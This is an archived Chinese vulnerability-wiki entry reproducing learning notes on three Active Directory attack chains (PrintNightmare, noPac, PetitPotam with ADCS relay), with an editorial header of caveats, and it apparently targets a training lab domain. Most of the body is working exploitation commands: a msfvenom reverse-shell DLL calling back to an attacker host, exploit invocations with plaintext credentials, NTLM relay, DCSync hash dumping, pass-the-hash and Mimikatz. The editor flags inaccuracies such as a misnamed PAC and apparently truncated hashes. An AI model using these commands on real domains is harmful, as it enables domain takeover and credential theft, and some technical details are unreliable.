---
cve: "CVE-2021-34527; CVE-2021-1675; CVE-2021-42278; CVE-2021-42287; CVE-2021-36942"
source: "gelusus/wxvl 公众号漏洞文库"
title: "AD域内网渗透-三种漏洞利用方式"
product: "Windows Print Spooler、AD DS、AD CS"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CVE-2021-34527; CVE-2021-1675; CVE-2021-42278; CVE-2021-42287; CVE-2021-36942"
referenced_identifiers: ""
identifier_role: "primary"
prerequisites: "各链不同：Print Spooler可达及适用补丁/驱动策略；noPac需可控机器账号；PetitPotam到ADCS还需可中继Web注册和可用模板"
source_status: "unknown"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
id: "vw-6c160cead34a0a3e9039fcc0"
entity_id: "ve-6c160cead34a0a3e9039fcc0"
schema_version: "1"
---

# AD域内网渗透-三种漏洞利用方式

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：各链不同：Print Spooler可达及适用补丁/驱动策略；noPac需可控机器账号；PetitPotam到ADCS还需可中继Web注册和可用模板
- 证据范围：三条攻击链以及证书取得后的多种后利用有独立教学价值，但产品/权限/补丁条件过度简化

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 元数据仅34527，应多实体归档
- 拿到普通TGT不等于noPac已验证，应记录扫描器实际票据差异判据
- MachineAccountQuota=0并不代表所有拥有既有机器账户权限的路径均失败
- 将PetitPotam强制认证与ADCS中继后果混称单一CVE，缺EPA/签名及模板前提
- PAC误称Privileged Attribute Certificate且多个NTLM散列长度疑似截断
- 受影响/修复版本缺失

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
- 验证须使用自有隔离环境的凭据；已暴露的真实凭据应撤销或轮换。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

jzhoucdc  泷羽Sec   2025-04-19 00:11  
  
本文基于AD域内网渗透中三种漏洞利用的学习记录。  
## PrintNightmare  
  
PrintNightmare包括两项漏洞CVE-2021-34527 和 CVE-2021-1675，这些漏洞存在于Windows操作系统上的打印后台处理程序（Print Spooler）服务中。目前基于该漏洞，已经有很多的利用代码，允许进行权限提升和远程代码执行**。**  
这个漏洞可以在本地环境提权，也可以在AD域内网环境中获取shell**。**  
### 环境配置  
  
为了利用成功，我们需要使用cube0x0版本的Impacket：  
> git clone https://github.com/cube0x0/impacket  
> cd impacket  
> python3 ./setup.py install  
  
### 漏洞确认  
  
**Print System Asynchronous Protocol**  
和**Print System Remote Protocol**  
是与打印服务相关的协议，在利用漏洞之前，确认目标系统是否暴露。  
> rpcdump.py @IP | egrep 'MS-RPRN|MS-PAR'  
  
  
![1744597137_67fc7091ed9e7cd02f35b.png!small?1744597138738](../../.resource/remote/71b861c64512bc1542a9741ca3eb839f341d64bca3f91d70cbd30d5f632e338a.jpg "")  
### 生成DLL payload  
  
在确认后，生成一个DLL利用：  
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll  
  
  
![1744597202_67fc70d2630b5a4b81d49.png!small?1744597212841](../../.resource/remote/e061e6c6b9a7b859dc4330fb1f46dcff52124a7c5a0e2a3a1b5c3c488f79e832.jpg "")  
### 使用MSF multi/handler  
  
准备接受shell  
  
![1744596535_67fc6e37cef6da798e857.png!small?1744596536762](../../.resource/remote/bfb4aebaeb7965e67ba4041cd10b2ed1eb79ea4694f155ee3c7d74b4bb3a1832.jpg "")  
### 创建smb共享  
> sudo smbserver.py -smb2support CompData /home/htb-student/CompData/  
  
  
![1744596644_67fc6ea4babe2b65ca1a8.png!small?1744596645661](../../.resource/remote/8f0ee7f5ee275344cc041c48cbec965cdf6bbf921c9323d12b72bb1ac3a5423f.jpg "")  
### 漏洞利用  
  
一切准备就绪，利用漏洞  
> sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'  
  
  
![1744596697_67fc6ed906e22e6621ca6.png!small?1744596697899](../../.resource/remote/54ddb083fc9a8a248411f208bc136f8d6c83d6c99ca00b3f6bd7dec45f3c2828.jpg "")  
  
查看发现拿到Meterpreter shell，已经是高权限。  
  
![1744596725_67fc6ef582c02eae665c4.png!small?1744596727003](../../.resource/remote/fa6112a5c98a5bc973ee57fa96b3a9af522bdc5f970627588fd77ba642b8c246.jpg "")  
## NoPac  
  
**NoPac**  
（**SamAccountName Spoofing**  
），利用了Windows域中的安全漏洞，允许攻击者从任何普通域用户身份通过一个命令提升权限至域管理员。这种漏洞包括两个CVE编号，分别为**CVE-2021-42278**  
和**CVE-2021-42287**  
。  
  
noPac利用工具  
### 漏洞扫描  
  
可以使用一个普通的域用户账户运行扫描器（scanner.py），尝试从目标域控制器获取一个TGT（Ticket Granting Ticket）。如果成功，说明系统确实存在这个漏洞。  
> python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap  
  
  
![1744871335_68009fa760cd0b8497b18.png!small?1744871335943](../../.resource/remote/33ad07bf1293a8c3f4ed92c59626bcc7d0205d33fb7f9076d41a2efeab3e30e0.jpg "")  
  
在成功获取TGT之后，表明确实存在漏洞，还可以发现**ms-DS-MachineAccountQuota**  
的值被设置为**10**  
。这个值控制了每个域用户账户最多可以在域中添加多少台计算机账户。默认情况下，这个值是10，表示可以添加最多10台计算机。如果将**ms-DS-MachineAccountQuota**  
的值设置为**0**  
。攻击就会失败，用户将没有权限添加新的计算机账户。  
### 漏洞利用  
> sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap  
  
  
![1744871640_6800a0d8d2f9ed67b3a22.png!small?1744871641616](../../.resource/remote/cb74a7e8fb449f6e3f0019ec071a026b6bfb5b51196c6602802ab4f8d7fa7258.jpg "")  
### Dump hash  
  
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator  
  
![1744871883_6800a1cbe4948736766b2.png!small?1744871884503](../../.resource/remote/4d4d6754308eaed0a5fbf48e96f8d8c577d375180910d9f85cce09bb7d924dab.jpg "")  
  
导出了administrator的NTML。  
## PetitPotam  
  
**PetitPotam**  
（CVE-2021-36942）是一个LSA（本地安全机构）欺骗漏洞，允许未认证的攻击者通过Microsoft的**MS-EFSRPC**  
协议，利用端口445的NTLM身份验证，强迫域控制器与远程主机进行身份验证。  
### 攻击步骤1  
  
首先，我们需要在攻击主机上的一个窗口中启动 ntlmrelayx.py，指定 CA 主机的 Web 注册链接，并使用 KerberosAuthentication或DomainController ADCS 模板。  
> sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController  
  
  
![1744803345_67ff9611265f430e13f76.png!small?1744803345705](../../.resource/remote/d5c4dd782ea0bbb3afd498f59b804ec856138761e51cb1fbd5ff6aa30e0ba20b.jpg "")  
### 攻击步骤2  
  
在另一个窗口中，我们可以运行工具PetitPotam.py。尝试强制域控制器向运行 ntlmrelayx.py 的主机进行身份验证。  
> python3 PetitPotam.py 172.16.5.225 172.16.5.5  
  
  
![1744803565_67ff96ed53fec4ed68f55.png!small?1744803565982](../../.resource/remote/959827edef2ad7a3a36e556131776f39090a3b3806c6f868f42f559c26d10161.jpg "")  
  
如果攻击成功，可以看到成功的登录请求并获取域控制器的base64编码证书。  
  
![1744803610_67ff971a6dea80932e6de.png!small](../../.resource/remote/e940d18174b92cd052a4c97b1a66b1ef44b1940c3583bc0074b541004ced9ea8.jpg "")  
### 攻击步骤3  
  
接下来，我们可以获取此base64 证书并用使用gettgtpkinit.py来为域控制器请求票证授予票证(TGT)。  
> python3 gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <获取的编码> dc01.ccache  
  
  
![1744809426_67ffadd2c04abe5ff83d0.png!small](../../.resource/remote/cc71daf26f1fe3ae3c1e0f1de2e80f95cb9a26ae18466d69ea0cd89a4a88d4e0.jpg "")  
> AS-REP 加密密钥：16950e24794e18ce18211c5ebf8ea22910b3854ffb9ce4c4ab0dcc8a5c390abe  
  
  
TGT票据保存到了本地dc01.ccache 文件中。  
### 攻击步骤4  
  
针对dc01.ccache 文件，可以用它来设置 KRB5CCNAME环境变量，我们在攻击时，尝试 Kerberos 验证时会使用该文件。  
> export KRB5CCNAME=dc01.ccache  
  
  
可以使用klist查看票据  
  
![1744809546_67ffae4a854b26f33dd1b.png!small?1744809547199](../../.resource/remote/d2437de50af7eb1ed4330cc272ad30ea89406570b6c93dcf1fce32c5584e7b3c.jpg "")  
### 攻击步骤5  
  
然后，我们可以将此TGT与 secretsdump.py 结合使用，执行 DCSync。  
> secretsdump.py -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL  
  
  
![1744806129_67ffa0f1af8e0ef8a930d.png!small?1744806130520](../../.resource/remote/ba0b88366ce445e084bee30ad001d42f675ca19abdb0f0a83b28dfb74ef5839a.jpg "")  
### 攻击步骤6  
  
使用内置管理员帐户的 NTLM哈希来向域控制器进行身份验证。后续可以拿到shell。  
> crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf  
  
  
![1744806569_67ffa2a9aa1b49e906a90.png!small?1744806570152](../../.resource/remote/225b70ccb35a9efdc9d0b88012b01c733f760cd93ffbb2b35bababe2bf424b9e.jpg "")  
### 方法2  
  
在这里获取目标的 TGT之后，可以采取另一种方法来请求目标主机或用户的NTLM哈希。  
### 步骤2.1  
  
通过使用**PKINITtools**  
中的**getnthash.py**  
工具，提交一个 TGS请求，其中包含了**Privileged Attribute Certificate (PAC)**  
，该证书包含目标的NTLM哈希。然后，使用我们在之前请求 TGT 时获得的 AS-REP加密密来解密 PAC，从而获取目标的NTLM哈希。  
> python /opt/PKINITtools/getnthash.py -key 16950e24794e18ce18211c5ebf8ea22910b3854ffb9ce4c4ab0dcc8a5c390abe INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$  
  
  
![1744809629_67ffae9d0c564d1520b31.png!small?1744809630146](../../.resource/remote/5aedf6c725ee31570b1a038240578c98482fcf0aa135bc5c5c422c231849eb5b.jpg "")  
### 步骤2.2  
  
然后，我们可以用这个哈希值,使用secretsdump.py**-hashes**  
，执行**DCSync**  
#### 使用域控制器DC01-NTLM哈希进行 DCSync  
> secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:7277f699a390220114d3571785d5d02d  
  
  
![1744810419_67ffb1b32faa0118c3de7.png!small?1744810420059](../../.resource/remote/a9c6c3949e62bdad299cdfd753a555319bd10ae55e14b85e6df97f4bba6d78d1.jpg "")  
  
一样可以导出目标NTLM哈希  
### 方法三Pass-the-Ticket (PTT)   
  
当我们通过ntlmrelayx.py获取到base64编码的证书，我们可以在Windows的主机上使用该证书，利用Rubeus 工具来请求TGT票据，执行**Pass-the-Ticket (PTT)**  
攻击。  
### 使用DC01$账户申请 TGT 和执行PTT  
> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<base64编码> /ptt  
  
  
![1744810601_67ffb269e5c74e243db27.png!small?1744810602547](../../.resource/remote/f1f592b21d4b5cf69e353a97d5f11f1cc34a354366f7a630d62a1e80c7ddaf48.jpg "")  
  
然后，我们可以通过**klist**  
来确认票据是否在内存中。同样的，可以使用 Mimikatz 执行 DCSync 攻击。在这里，我们获取krbtgt帐户的NTLM哈希。  
### 使用 Mimikatz 执行 DCSync  
> lsadump::dcsync /user:inlanefreight\krbtgt  
  
  
![1744810851_67ffb36347ab5f91b73d5.png!small?1744810851780](../../.resource/remote/12df4e99603d3904d831f020346ac8ab653fcd2eba8d1e11e7dc5a3bb0ca72fe.jpg "")  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
